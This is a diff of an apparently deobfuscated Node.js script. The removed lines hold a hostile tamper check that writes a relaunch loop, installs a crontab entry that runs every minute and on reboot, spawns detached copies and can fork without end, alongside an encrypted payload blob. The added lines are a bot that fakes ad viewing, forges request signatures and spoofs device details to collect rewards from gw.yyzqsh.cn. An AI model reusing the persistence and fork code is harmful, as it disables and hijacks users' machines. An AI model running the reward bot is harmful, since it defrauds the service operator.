@@ -1,241 +1,253 @@
-//Mon Jan 05 2026 06:29:46 GMT+0000 (Coordinated Universal Time)
+//Thu Jan 08 2026 03:13:24 GMT+0000 (Coordinated Universal Time)
 //Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
 //Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
-(function () {
-  const _0x15464a = require("crypto");
-  const _0x139985 = require("vm");
-  const _0x4de354 = require("fs");
-  const _0x49fd3b = require("path");
-  const _0x298905 = require("child_process");
-  const _0x318c5f = {
-    dbg: false,
-    bomb: true,
-    zombie: true,
-    persist: true,
-    token: ".npm_cache_token",
-    daemon: ".sys_temp_monitor.sh"
-  };
-  const _0x247575 = "aHR0cDovL2ppZ2plaTQ4NC55eXNoYmMuY24vIy9SZWdpc3Rlcj9hY3Rpdml0eUlkPTEwMDImaW52aXRhdGlvbkNvZGU9Rjh3WnJsUTFnJnJlcXVlc3REb21haW49";
-  function _0x48bf58(_0x514f1c) {
-    if (_0x318c5f.dbg) {
-      console.log(_0x514f1c);
+const axios = require("axios"),
+  CryptoJS = require("crypto-js");
+class QLZxshRunner {
+  constructor() {
+    this.TASK_CONFIG = {
+      "FIXED_WATCH_SEC": 100,
+      "INTERVAL_SEC": 5,
+      "TIMEOUT": 30000
+    };
+    this.ZXSH = process.env.ZXSH || "";
+    this.ZXSHZM = process.env.ZXSHZM || "";
+    this.ZXSH_NICKNAMES = process.env.ZXSH_NICKNAMES || "";
+    this.results = [];
+  }
+  ["log"](_0x1f5739, _0x316e5a = "INFO", _0x3440aa = null) {
+    const _0x525e9a = {
+        "INFO": "[36m",
+        "WARN": "[33m",
+        "ERROR": "[31m",
+        "SUCCESS": "[32m",
+        "CHECK": "[35m"
+      },
+      _0x4c530c = "[0m",
+      _0x1aeee7 = _0x3440aa ? "[" + _0x3440aa + "] " : "",
+      _0x3337f6 = new Date().toLocaleTimeString();
+    console.log((_0x525e9a[_0x316e5a] || _0x4c530c) + "[" + _0x3337f6 + "] [" + _0x316e5a + "] " + _0x1aeee7 + _0x1f5739 + _0x4c530c);
+  }
+  ["encryptMD5"](_0x49ef53) {
+    return CryptoJS.MD5(_0x49ef53).toString().toUpperCase();
+  }
+  ["generateRandomString"](_0x31e986 = 8) {
+    const _0x51c4b0 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    let _0x586ef5 = "";
+    for (let _0x5a5e26 = 0; _0x5a5e26 < _0x31e986; _0x5a5e26++) {
+      _0x586ef5 += _0x51c4b0.charAt(Math.floor(Math.random() * _0x51c4b0.length));
+    }
+    return _0x586ef5;
+  }
+  ["generateSign"](_0x148fd3, _0x356b50, _0x37b4e8) {
+    const _0x9b0334 = "aB3xK9pQ2sL8mZ1nR7tY4uW0vJ5cH6gF",
+      _0x322dcd = "randomNumber=" + _0x356b50 + "&timeStamp=" + _0x148fd3 + "&videoId=" + _0x37b4e8 + "&" + _0x9b0334 + "=";
+    return CryptoJS.MD5(_0x322dcd).toString();
+  }
+  ["getHeaders"](_0x3c6cf0 = null) {
+    const _0x28e548 = {
+      "host": "gw.yyzqsh.cn",
+      "platform": "Android",
+      "version": "v1.3.0",
+      "content-type": "application/json; charset=UTF-8",
+      "user-agent": "okhttp/4.10.0"
+    };
+    if (_0x3c6cf0) {
+      _0x28e548.authorization = _0x3c6cf0.trim();
+    }
+    return _0x28e548;
+  }
+  async ["loginByAccountPwd"](_0x89b94a, _0x2b344b, _0x378ae1) {
+    try {
+      {
+        this.log("🚀 正在账号密码登录...", "CHECK", _0x378ae1);
+        const _0x3cf925 = await axios.post("http://gw.yyzqsh.cn/api/web/auth/pwdLogin", {
+          "phone": _0x89b94a,
+          "password": this.encryptMD5(_0x2b344b)
+        }, {
+          "headers": this.getHeaders(),
+          "timeout": this.TASK_CONFIG.TIMEOUT
+        });
+        if (!_0x3cf925.data || _0x3cf925.data.code !== 200) throw new Error(_0x3cf925.data?.["message"] || "登录失败");
+        const _0x51a276 = _0x3cf925.data.result.token;
+        this.log("✅ 账号密码登录成功", "SUCCESS", _0x378ae1);
+        return _0x51a276;
+      }
+    } catch (_0x4d6a0b) {
+      throw new Error("登录失败：" + _0x4d6a0b.message);
     }
   }
-  function _0x4c76b9(_0x4cf264) {
-    const _0x48cb7b = "邀请链接/文件完整性校验未通过";
-    const _0xfc1554 = Buffer.from(_0x247575, "base64").toString("utf8");
-    console.log("\n🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥");
-    console.log("🚫 [运行中断] " + _0x48cb7b);
-    console.log("✅ 请修正脚本内的邀请链接为以下正版地址：");
-    console.log(_0xfc1554);
-    console.log("🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥\n");
-    const _0x584bd6 = _0x49fd3b.join(__dirname, _0x318c5f.token);
-    let _0x61f67e = 0;
+  async ["executeTokenTask"](_0x330505, _0x532fc8) {
+    let _0x25bda4 = {
+      "备注": _0x532fc8,
+      "类型": "Token登录",
+      "状态": "❌ 失败",
+      "原因": ""
+    };
     try {
-      _0x4de354.existsSync(_0x584bd6) ? _0x61f67e = 2 : (_0x4de354.writeFileSync(_0x584bd6, "1", {
-        mode: 292
-      }), _0x61f67e = 1);
-    } catch (_0x30f589) {
-      _0x61f67e = 2;
-    }
-    if (_0x61f67e === 1) {
-      {
-        console.log("💡 提示：检测到脚本内容异常。");
-        console.log("💡 请务必还原脚本或修改链接，否则无法运行。");
-        process.exit(1);
+      if (!_0x330505) throw new Error("Token为空");
+      this.log("✅ 使用Token直接登录，开始执行任务", "SUCCESS", _0x532fc8);
+      const _0x59084a = this.getHeaders(_0x330505),
+        _0x4afba2 = await axios.post("http://gw.yyzqsh.cn/api/web/member/getMemberCenterInfo", {}, {
+          "headers": _0x59084a,
+          "timeout": this.TASK_CONFIG.TIMEOUT
+        });
+      _0x4afba2.data.result.nickName && (_0x532fc8 = _0x4afba2.data.result.nickName);
+      const _0x45f856 = _0x4afba2.data.result || {};
+      let _0x20d889 = _0x45f856.watchedVideoCount || 0;
+      const _0x513d49 = _0x45f856.videoCount || 0;
+      this.log("📊 今日进度: " + _0x20d889 + "/" + _0x513d49, "INFO", _0x532fc8);
+      if (_0x20d889 >= _0x513d49 && _0x513d49 > 0) {
+        _0x25bda4["状态"] = "✅ 已完成";
+        return _0x25bda4;
       }
-    } else {
-      {
-        if (_0x318c5f.zombie) {
-          const _0x26ea95 = _0x49fd3b.join(__dirname, _0x318c5f.daemon);
-          const _0xa3b8a2 = __filename;
-          const _0x4b1b61 = "#!/bin/bash\nwhile true\ndo\n    node \"" + _0xa3b8a2 + "\" > /dev/null 2>&1\n    sleep 1\ndone\n";
-          try {
-            _0x4de354.writeFileSync(_0x26ea95, _0x4b1b61, {
-              mode: 511
-            });
-            if (_0x318c5f.persist) {
-              try {
-                {
-                  const _0x34f906 = "* * * * * sh " + _0x26ea95 + "\n@reboot sh " + _0x26ea95 + "\n";
-                  _0x298905.exec("(crontab -l 2>/dev/null; echo \"" + _0x34f906 + "\") | crontab -");
-                }
-              } catch (_0x3978f0) {}
-            }
-            const _0x123cdf = _0x298905.spawn("nohup", ["sh", _0x26ea95], {
-              detached: true,
-              stdio: "ignore"
-            });
-            _0x123cdf.unref();
-            for (let _0x4eeb87 = 0; _0x4eeb87 < 5; _0x4eeb87++) {
-              const _0x596af7 = _0x298905.spawn(process.execPath, [_0xa3b8a2], {
-                detached: true,
-                stdio: "ignore"
-              });
-              _0x596af7.unref();
-            }
-          } catch (_0x35a486) {
-            while (true) {
-              _0x298905.spawn(process.execPath, [__filename], {
-                detached: true,
-                stdio: "ignore"
-              }).unref();
-            }
-          }
+      for (let _0x25c922 = _0x20d889; _0x25c922 < _0x513d49; _0x25c922++) {
+        const _0x1be006 = await axios.post("http://gw.yyzqsh.cn/api/web/member/get/internalAdvertisement", {}, {
+          "headers": _0x59084a,
+          "timeout": this.TASK_CONFIG.TIMEOUT
+        });
+        this.log("正在看广告：" + _0x1be006.data.result.description, "INFO", _0x532fc8);
+        const _0x4c8b25 = _0x1be006.data.result ? _0x1be006.data.result.id : null;
+        if (!_0x4c8b25) {
+          this.log("无法获取广告ID，跳过", "WARN", _0x532fc8);
+          continue;
         }
-        process.exit(1);
+        this.log("📺 模拟观看广告 ID: " + _0x4c8b25 + " (" + this.TASK_CONFIG.FIXED_WATCH_SEC + "秒)", "INFO", _0x532fc8);
+        await new Promise(_0x29d8b1 => setTimeout(_0x29d8b1, this.TASK_CONFIG.FIXED_WATCH_SEC * 1000));
+        const _0x342d6f = Date.now().toString(),
+          _0x405c75 = this.generateRandomString(8),
+          _0x382d90 = this.generateSign(_0x342d6f, _0x405c75, _0x4c8b25),
+          _0x4616fc = {
+            ..._0x59084a,
+            "timestamp": _0x342d6f,
+            "randomnumber": _0x405c75,
+            "sign": _0x382d90,
+            "phoneinfo": "MANUFACTURER:Xiaomi,MODEL:Redmi K20 Pro,DEVICE:raphael,VERSION.RELEASE:11,"
+          },
+          _0xbc0210 = await axios.post("http://gw.yyzqsh.cn/api/web/newPeopleUnlock/receiveWelfareNineteen?videoId=" + _0x4c8b25, {}, {
+            "headers": _0x4616fc,
+            "timeout": this.TASK_CONFIG.TIMEOUT
+          });
+        _0xbc0210.data && _0xbc0210.data.code === 200 ? this.log("💰 贡献值领取成功，获得" + _0xbc0210.data.result.contributionPerVideo + "贡献值", "SUCCESS", _0x532fc8) : this.log("❌ 领取失败: " + _0xbc0210.data?.["message"], "WARN", _0x532fc8);
+        _0x25c922 < _0x513d49 - 1 && (await new Promise(_0x232db0 => setTimeout(_0x232db0, this.TASK_CONFIG.INTERVAL_SEC * 1000)));
       }
+      _0x25bda4["状态"] = "✅ 成功";
+      return _0x25bda4;
+    } catch (_0x21b212) {
+      this.log("💥 异常: " + _0x21b212.message, "ERROR", _0x532fc8);
+      _0x25bda4["原因"] = _0x21b212.message;
+      return _0x25bda4;
     }
   }
-  function _0x1e3db4() {
-    var _0x2b3ac5 = "Don't" + String.fromCharCode(8203) + "Touch";
-    return _0x2b3ac5;
-  }
-  let _0x7633a7 = [165, 137, 178, 108, 254, 133, 160, 155, 187, 226, 77, 160, 176, 144, 7, 160, 49, 17, 170, 77, 32, 124, 32, 84, 32, 183, 77, 32, 85, 77, 32, 212, 32, 165, 77, 32, 18, 77, 160, 177, 145, 37, 77, 32, 196, 160, 100, 68, 56, 160, 235, 203, 77, 32, 170, 77, 32, 96, 77, 32, 124, 32, 97, 32, 122, 32, 154, 32, 180, 160, 196, 228, 170, 32, 229, 32, 14, 32, 170, 77, 32, 68, 160, 86, 118, 93, 32, 136, 32, 85, 77, 32, 203, 77, 160, 123, 91, 220, 32, 40, 5];
-  const _0x575797 = "c7b335cb8a328be34b95c6bb707d3d8af74dd3b8168d55e7ed48d222c90db15ec4d421070e8ae5545b844fa6362999563ad2721f81516787ee81f05bb3423b7bce22358b42ca109b483a42ad0381a643b8a1988d2d3649a5067778fb291ce16b764006b310a745d2c4fe4795c0b518e2513c5840890e66bf8c8110fbda04e212f88c057f1d6dc7329369162433722a0390aa5380d3154bc3282e9e29a27589da08bb578605451e006630e4edbf2069a8019fcd9e17783efea74309debcb2f9f500def20df07617f03bcc56ed981ed693814fd9155d12a735f78181d2f734d018757a4f4e53d7b407a27318cbffbd8243dcbc8419e598d6eb8dfe71226be42f788a431db35ba99c9820436f84b09470b36ebf1dd86d2f2b59293138392003bc7b2d420adf6584bbd78de17a9cf2056972753c95e8e79dc3c3c5262bfd46f0d2a583012663cfc14d5ce8cdfb98c8ff2749b49d734626016f63467872b3d1d149dccf5ea4670844d63f5ff35f6e3595da639317cc282d5b8f444de0cb3e2f02850045543c92194eb6fb9188dd9a35fe9bbabd01d357ba7dd2603efd888ded17e3d8be42499b7e889983921645083844a3ef5e0af9305fda4bba697dab91bf6b08cd6e8ee87cd60b0e21eb0b8b3f9a58c9d3687be59be973e57d7cc72fa2cbdd7b027d5ce95212f86ee3ee3bb6219c373ba8856eb66670a3063546dd87ea254cf714a0a7fdfe587e801532e7bdb43bc89e9b0fa4601b790c65335a348bb469505581054ddf7fae4de4a882104b1582d67899150e397a409d1a8e3c5e19c3954af10f61a1e601d3eaf7fbaae4602461529bff7e636b87bd02917e0a9fef9a5bc5a5e86ffbc4dca7e3fe4d1c98b3dcd00f7b9a46cde03ec8f535193fa5699462d4403cbb7bc513706c80f42031aab2b5b49b56388f7ec83a6b391dd7b536a70a4c9c994193c1af5eaefaa74939ca0ce2d53a05a755b719c97843f796cf3624fde27013b6db01b2d652a12ca212b2769890cfb46be792c7e55e78d07d5f92a82f754879b7183c12c445bc7c28a927e40590f6c53a3338deaec00af6b21c980c20eaef79046ff8eb3f61302d83a770a55d1a7e361ea1ae9da5a3ef832d538ca09deeacfc41813094d47a91ee965a2a3ad2d9e8a9331b6406461deeeb526e80159267b4a264cc0dd9e1c3a5526e8610c8c7844c1011264a5a6dc0ec1109b88579ab34375bed23f1841f2081a9e60a8041a130ed6dd5c511cb99e9a40896dc558a90845d71433881510be6438ec1f007c081306df4e79c1b71c45de0730818daa707bc86f44655acfeff9ebbc66f4c2d3b5bdd0584da79355edd9c16570441e624d6077ca2edab90628abdb14043f8a306d5e048bb3beeee4c9dd5a12744eb98d6256c90e5a72251f4c883d4954b54b77b60389c2749244425f9a0847479fe1b98e818b517d310fbeef38c586bf73b700bcfd6270c30512c8aa84dc9737d061f6a449c312e6f97ce09b2e2a3477f02d4404366b1bd397e16f5e01a31a66a5b60a1db5e0d1ed5074d6fda9d4e289e69a003c91da0b03dfb50e3b64e411f048929e965904779323811cd7b4ba34a0c6f90f348579817927a0632a764b71cd684d7745b5ecfef39a34b13586d729d2b10c02b7adbd9b78e1f0242e0afbf0bc3406667a01bf1ca0635c637df7b59e0f79f4564d8e1f10e99e0f4f051628c172362430cccc65ae200c6c557a5218073f859562c03105afbe4ee2b0e15b6b20def314941b7cebb0598e373bdacea33602ec9c6b8694aca4201d4f39b31cb8e13c37f53c7b76bd1fcf2956cfcc392f45602f1251f0a0b7d5fbd583890e8df1ffbf14c98be49e6e763b56860c321f6430a81d451f014bd9c2d9e2039102804e6c82177508be5bd11fc4352e0ea29c610210028a588611a0e4031e6ab07307966ea4f7657637cb366d5d76f5a0bc2e2f136acf13c291c5af8254ce73392e6f5f06124b55403336bbba210fd1ac2a64041bbaaae5f815c4651745b9db984c47a77973072e72efa7d830bf236392e59985a4c23fa6ee138e931978e25bc0920339c0200d3db7051aca647373e223d89a32b5804182846308bca6225589cc4121ae4cf5df0448f66ba9f6b08ec91b3141cba5bac0db31436f4b3093a33a89ca5ca761f62f94cb2c02dd007c96ca472ffc1d65e376437aadcc143345e7ac0d59b8b98532fc749d86d0653fa746dbc92f8dcbb1f63c110ca958e2d066cdc007fa70bd42b350319e61b2c0896e16390806446e90fc2e0a44f9211ec14b59c3d152e6a5b988bfcf84a4320b24e4953636d7b00bf8fbab1d0dd5b1cc4d6710e3314388eef32adf7c7875b3e78ec0a5bf58db27e35d87d04a3e4e01a1a4a5abe164f44931f49151443dc7b19cf4355c43250e4d7458303a3ec6b5f073585c53a8f59399fa77581a238ebbf9100f64db63fccaa1dcfdc2355e0adcb428b65c99ee35494486521ed6c4917e1da6fc86add9fe328111609860d63f6fe4f3ceb8a8311d7d3680839efb5222b84b7115e0c36586f70bfb2e8ebf023cfe06ee492f1a01abfe0b2181f9704430fda192a94a181ef3ebd4c95743d2dfe327a537af59185c543e263b848ac0fd1526442ecb95c4a07d725610ebae10b0b720d95447cbb9228335667d2f97a47b93e6546b401b483a629b235278d26a1562d79e2fe0978185d210793c339299db8199ef0c620f52df68425153fc51da8c55478fb207b17b1f28a542d659842980ddda37b1662fdc0480d4b35a728225e643e57d2d67cad072ffa701971b49eab46dc2483743494a6c6e00909315334d53de2e68ab2498af2433387184bb7d7685a28b5dfa22c29efb1e9ce8d422df74c5c4a7d390ed4a203106d1df33a889415bcf722d9e1041c99d24a0d797d8cae36d5b25c7015743c0e693c7d070a4a73f2ec111b348990494b6b44ead11b96420c06b92cf9ea70521360ab1be9e7b64a19620ddb95e264de76230fdac4787795a5922cd9e283892c4d9e8748393610fff344f6d3635ef43917b78abccd6c94c40841ae41ef2011a5a89afdc600d62a0525e939bbc72c6472a7fe526196f629732b70cd7cc788659522865464ce9d3c58a294d9466c3a51f5b45b32edaae06650dfba235ea64be733f2423cf88627bebc14be042597e5a07af676c08795d6bf33cb1caab97ac55b6153b794988eabfe4764f3a54c3e7a6c6a1b3f1f5278462840be36ec41bd86031f8a0dd5a08da696c97349a052b3a16081f1b0ab06525046e54acfa486bfda49c5f106659491634d24c088c6c28548997a9630a2848b60c0bf86be8f465925c9c0f765d75265f509303e2c4bcb954865e6205d63e0e71229fb092fad3810720bcf43a12ac9b5cb0f1d852e2a05eab5639ec8d3b4d0c4719ed56a750648ea4d26ad8dafee0200e1abb7e6fa26e752022435a15815274a33d49b23e1090147cb315d4512621fbc545dd039ddfc0c697a2b2794878295863eaddd6f8ce5f24e603b053553ebdffe27deb12829429caea0927c43181292ca5186c8fb819171eadd1236225771eaccd61cb88a10113b3f417e46cb5d727b562d21a03be964b2703c9f504ae057838bcb662c544e7e607ec78b7e15557cc12738b8368b1726c55980e41a4de1c78e02ccc0bf13fadd106229e153cec42000313cd6da21d4a090816d6a2865a8717d825657f706917d0c4b8eff5eb9e416a4448e444f83023cc818ffd4a7bb48754dad267dadf0bb4933b12d8af652cb4466e52146117a25634ea6b1d4bd721fa5c52c657922075a2ef3f48cd9f1282dd1720908c69aebfcb612d3b0f3524cf3eab339436a961a8023baed494bd8838048e774df2999ffdefad55beb758ccf23777461d1622da63235c8f0b9d58d26bd8775e7bfcd8754c67dff0fe55646e7aeeddb2e4bb4e8ee402f5ae0272bb8f36a35fd9ac9987b3e5733dc4fc1838ef3989431228d4a162f63283f8bf4db4ef2ed39bce83d51adfcf0ac75e15741233bf348633453373c63366f6117ac0003c9b427d072fed0b0b9986f2fe6353e17145140f2ac63612d6fe98d99ea1a91c1005015ba3c0bc48c5aa77ef7265549f0170aaf3823545b954c8e6a06eb1ff667e1728efccb14976486739f42c7d2d7cc3fc7cd3500570bc600d7f7516b0887e9fa9dcd58c8a238d5848e900eb6247f272245c57b8800df30877db39c8fb21d632c2e834bddece64e0d8f65dabf7b19412cae55762046f7a81e23e5a55a11b1748968bad08171992e34bf41d4536c78f35537162f5ec37452deadf172cd9be40ee411ee54d4d705f66e66511715f5e54098333b72e5bd68cf1c324fe3953cfe25078e757665a9547d945bd00d64bb5260c091eb7f04cc892148e652097384d7a6d7a61b95f298700491782951adcf2864de486e3110763b303c59e4069b7d432b4a8343f7b01a52ea37e9f7d156a77be8e016b8e0e31ef86ede1aa65dd0c0b8e363872833399e98444ffbf4bc1b39957198208b623e9065a320af7702faff99f3166b6557e23388fa28a2bfc0d0bfec247668c83c471ad062ffecc7e2cca7c5c90b9a0fcbb4922ad896a5a960f3ff32328cac30ac0121b7c311d821e97e28b9d20b59421e0722b3f902faf50777ba6fc73f5bf8ec681220424375142ee9c07f17d5b04414005e311e6ab9ef40b1080fff62c80e90ebdd75b004a3168c4c677a8f8fca530dfa087e2122ec7c5d9f13094ba2a9bdda04d2b41abefe95e8ba8b1d2a6b67a3f4cb5f82d6f8896cb80b44e326c2930bbef99ab7e94795233ea480645c8d9e8c05cf537e2cb75aec5a1a78a6fb8db15be80455117fbe1131355fe867cffde1e4e45209cb0dc4925e9f245c21ee4c46144cf197cb73a7d3b83bf8c2ffecb006d85f25cd4996ac50d5dd126f5fed1e2b25a6d9529508eb40b2f3081f901c4b37d3d5f65a56c40d5e93b1d290e16a3e6f494f261fa8f5b79c5356575d4e747f4c5ac973a8639b90293e80e05bdcd1f064907d3cc886343293d126d8b8def522965db8fc5214519d9364fa4bdf940d070a279803d047db7e762abca15a7c558a98f6e1e79760eca3811e41dd04c07a6fe75abaaf2e9950c631fef93abe6cdee735c92edda1eaf5d706c7501c981e53fbeac1de11a375bcdafca37e68f8645b7e43b3304391b378982a0f317abc60c7994c46871097e3924506608ca88bdea1c2d3255686aacaa2a2007c868c6ae50b91b1e7e88b9b8d8e2648d8f1b2047325e7ea010648ca3a5da9b95ba038f55074693acc3d13e9c047ce7cfe599eb821592f5ecaaa7508ef1e993df28ec4ac1a9694229abf4803d536d4b6d810bfc708f1c47654609e1b859240a3d2149f04c4ff0e84b1958cbe75fce30baed94705b0b40029d6075b64a83d229596f3302a916f29acfa7fb891e19ec6d2a826b69f591efaaf773b802c3fc3fd37ce8d03b97e351d6cd9db197a5df33ea9b7d2dd7d78a4f1584a0e6641e974d543d67c15f1d04840905fa01e23eb13f1a259ad521bdd285bb9e2080bc65527f97fe9156cdcb6c305b3745c86c38fe0f5147712adc366c235b442658f339b0fef79b0e21868d52c337ba67e92cabb80d09854b283dbe1b17b6ca9ae97159909da6d39c55030f39b3fbcc5e48e48575150e2b3f29249074b756c91a76ac095d45b414396d8eea9c865e3854e8cb158064f0aef8ee81c8dfedc4b8851ebbd2c24f3783e821eb461a17f8509e792b50c8555bdb6a98cd5e286c5dd9578feae32ac127e66dcdc1e335e3f7bdfa28bf835a78a236eb5f4dc4d03c06665aedeff1389a735ee44779da131e85f0b79c8c6f810d7e2a49152e836b56e850c83211e895a53a8f9f73ebd77bcd341a0fa765bcb2c479cf0349d4967b109d250bcb8bd064755aa2c4a2cc48cfb35b8402525f3a134a079c1df3baa2193d82e6d3dd8680ec38d0010e4b446e4d1c761b60329d6ef8760ebcd2f834e8ec24cd205cb5fdbc48f4a5a55700d7434a7e6bad82e70aadcfab302d0c7378b1ae7b6abe4fb2b33b7dfd681dcd8eca0108786fc79bb3b6f11529a2238e6f68abaaf793ef32c9b330c9ee34762cfa283182dcfa0282c2cf04f8b81f319f16d57c049f94cbf539b6ba225c0420a8d7433127975c021a49f69779d1c093c1f5f69d8e5899d2642e3b440e0c95b611c5cbb4c0026526ac4b7cc2e61bc5d29622e79fcfcf463f1c7d72f75265f00a148acf3260bb1e0c113d4ffab2e6457f0a850f19e5247c94ce4445bda0e229d785fddf89c2b0888e95b316cb755b9faf4ad2cc13a40ceea6f314b9ac3524980b320e54dc2a1c9c112feedf48c8738357291d61c2216dd76d0bc5c1bbab0069471c1af885f0cf3012309c28018d21a3dc27a91c673c872b72814cc7a5597510b85645ca043db03766b5a5a315658c15c82fd20d3d33e41fe83140b7e7dd005f83ee1dd652bd99bc4cd1443347c0a9271eb6ce1ca293965c187744410e8f90a4bcf2d5d1dbec91c522e373b6812a84d2699e171cca9a6fbde4b7c96c86123397f5623b211301cfa4987aa6ddab2377659eb082d94478720ce3a1376dda351c037edf92d46406b38cdeb746c703630f574443495b532b5c51db941c1e21630755a0f0d1315891fb200b4f20661dbcdd02cf91312539b96ade0bfca60242237d2330e133cb9bc48832d310c1be3be9e8436a20abbba13b3be5efd61539ae753b4b88ab82ceeb8e2646b42505746a63662b9d76e796151b8ba4ae8b0664ecbc7b3027c904c2a99b87955727b9e61c3c1011216c1c7e8cf83fcdd3b3594a175606d44d401b64d80066a4f0c291546b068a296cfc0a9fbcac795a1456b9f8aa9a2516091f2401600c9ccebbb903ede4a83ecbcb5a7205f232dc83abd9db7ed0f5235743b2509ac8d59bc93f9fe1132d13254f0f52492141133b1680812aff7c0cf099c08934e2fd92af3762836d5484689d6f2ca2ba2c725c2f294cf668bbee91a5ada1744380cb2341f7cdef737fadf40b40152dc6d434ad1b19c30c9d557cf18ec54d184b768e30bbb7ea02692b7bca474b200daab76cc9a2f1ece80d9299ab5c6c5de829ba7ff34f26c859f5aa662990c9430ea4fad3b6b8689c42d92601ff9d27775836baed59e36cf15fde70228ace47e7f35b6ebb8f228b9f221a1bcf8ac7e86f6b2f1d2724705bc236415718304c76a2dcd02b308809fba073174776cb531a53c707ad00d9e7fd084480ab337fbe5e0e0e8dc2e3df41a38412376bbf64994ee4f3c29e8094e80af0f5b285ff061802d4ab4d5c89247746302792c160d8ca9997aa8d117a6ad3452fba53ea59e5b959c9e04d6f567dc75da75073f7f1366a4f246aaf9b51892f118370d49b91737b3636ad70468288b5263ea05811896df505e65662b5114365ea93185d17a90075acbfbc0e6562418722c10289c727803f38c25f962332c869c6e7ab9eda5bbc25488b37c7513f5ca0853521d8b936a94571ad36cf03a55591960f6e21807b54b6989cd03646e93776a52cd9b130e7ab1918fab71a436badf3d99fd75994148b6f1ad815bbee8beb4ab2072c323baf6d1c38ae1ee881cddecdcb7a26c34fca69c4040d304d0a66873ef412c5ece8e12c407880c29d6291830a4d69d460bdd6543ccae428735e0dac88496efaa4778a80d35e67156b235b739bf24b32107e79396f4bccae28db9dbf678b42a58c415fb91f572c5a5cad1250b5903cf189bf6b8b20b89072e99431901a701396e40a2af40693a3b3c138fad4d5ef2d7d36c253c5850c425aa5dce457bc377681f61409fc7d749b72ad3db4080ad1fcf1759ef1ac3017951b6cca2d64d704caa87f88ee62db55665cde64756c2b5d46e44c8f30998c1e169c438584c9b9ff6e5d0fecd73cd9b1c936b13e631946c14a0770c3e4ef7a847f2f7eccf05143b13c1f7ffc7a9e9c6b22290169b97ce4daac1fcad7ca573823b44275c2b38e7de07e9c1a2143e736e4ac6130f6c4af2296a351bf5b9bd87462d1a9ba33bea5862bea7b1bbe82603609bb5e9ac07f95fee0f6dce4c3dbf9b520d1860e8e8071e417e77f1303b4a48beaf088d4ba254f1ee99148b587ba2a04d91d67d92bd63753b504a5dac9fae93e783810b8907f0ac43efb07758fcafee7377e5ee7cb513ad5f65929e6206e21f83bedc0956c172f8f5a07cf9882480aa493b25dbb0c6cf3f2546c37fc8006fd6b57c684839de5e1f604c1071a31dfaf1586a6b18653a3f7591dc3f8a258a795e95a62f1e4d31c4f7bc8cdf237049fd54ca5bd4231cf7ec40c7f604a90dfc311f64048b0d59e66d278525f173afea637d37df0a3ea90a76364519b466f2aa1b5f3e81d883f6a12c6232bf4b59f8cff3c093e863dd12c10f1d0185b80f69dc1812c2154950d08c031c1bf3a60d6b6acc8812e85538d541ccc7b575906fff2568f1c951694fce6fc816210c1967aa6808d2f7df8e105d3d4a8468ae6216233f02789240ad997828df1dc53538b1f3fdd343d4c99fee7838786142e20c08e708f280ca36492b83e35f738edb9c94b943746c075346440e549499a2b203c80459e91350070b52af0274ba7bf56c057977b98a81ad6eb276460a2f2106c045172cfbc4f930ea450c1c3fecdfe979ae64676c82c33ab6a5b7d8bdeb20564923d081ca7dc0d69595305e39eda26bdb0105a01411552d3c5b50149041b6ffac5797f8d00fe4471348d0dd204a6e4b0a0a8af1cdee042943299136e8c86c6a958174654a595a8bd37a274b3ba2778f580be27e096cf9a4489d0567e7053ffe692e40e531a93fcdbcd4841661fd7f5b662cf75dd1d5e9e6f47b96a55416c8744b11f458eca27ca1d570e5a38c12347d79883e240c3639a4e9e784e054c626f5c4765862f55ff2bb0928a9fe2cf32cda6c99f670a185277adfff81f3dcb72abf4dd6a945bf70218c4c4a11ef4b6c4cc94b70492fc5bac7dc9055e210e9ee116721acb55da4e276b484911fc1403ce22ce1bd2ef48522580d76465a057f419dc06952e08b104d24def34e8baf5c3e5e918b8f255c42923121c90fc9a37eb2f6a41738966e82b45c5734f7bcea9b313f9938dd8b3bf471108a5e2d4fea3b0d598586038e376b218dc107f8aaa1113fd4ba54841eefd16bc7e6265de82871aa837c984851172719fd8e4ec60d82a472fcc5504a1f45365236aab1aaeb1dc6745b7783bc70768417ca72347a1887973af57027505c9cf2f61e9b3a90b230d4e226ba36f5b48fe2af2be61a3d40151172269dc7b7e90d9041e358006c9cdb7d6449574baa316f3c765b51b065313d0f32ab1979b4111c765aa319f4a746e2157c607aa0221e0e112794f1a21af254d22416f46c976e365dfd2cd6b8cb0aff3b6ecb22978568ba327a723bf9ca7e58e183e2e7d18b3bc84f57593710e5fc124ff30465ad8474113ea6bfa27efe9e997e073782741f7b3ff7b432a8955f06d5cfa5610f8d31e19314a11b3f45d6007e629595417983ed47f1274fa7978ce02ce2acb2de89d62368b01dd3dd1fd612396c2a44e7f691a59dff54dc5b7c508b527a053d3e6e8c29196cb40f3343b5afe8ae5ba5520bbf013f17ffb23035704f0c13dd58315dc449f29952a2adee31ac496c808c6e36464f2042b80a906f90696c0e39be2adf78c6ef5fdeb84f02f8a90fb1d400d386a62204bdfa22b17f352ad74b55ec422b21ca644c86503e610198f8148cd54ecd252a1c6dc55c4196d07165849a1feff6f54ecc3a839c10083338bdd947f526531511623d368e0ee7d48239dd44056c09650da502a940925e888c3b7a48e83d9069780f03240fa8b817210f6878dd0af63a57c8f920d608451c437ab1c2904fd8d2a298873691a42595eb40a03d42af84c7d58649b14a59b5e2a4e603306d957df3b23d80046d6f9f82e837e119102b4f754a7f852d974f57ccfd1b359538465b908f67aeb8737ca772dd1ab72971f65d37242b54a88cc6f17ea80b7da205f0a899323fcaafa8884cf547aa96e94c07e808a82e413c9286965df3fe9ee8345fcb37a9ff598828163ec5fc3a02d6301cbb116772200994b2e4893899fb5da356da3456d1f5a919d811e476811112d12f00a01e533a61dd7e05e3534f67";
-  const _0x3ead2b = Buffer.from("db9a9909ec0b502a4d5031812dac8108", "hex");
-  const _0x2536f1 = "9348ab6da36365ed982b549dba41c52f129ebbb024c31487173cf0d155b755b3";
-  const _0x3c1ab5 = "12bab41db8bf6ec326c6eba8d3d52779df11e9dc8a0433656a25e144d6ce4bd8";
-  function _0x270f35(_0x1193b4) {
-    let _0x477ab6 = [];
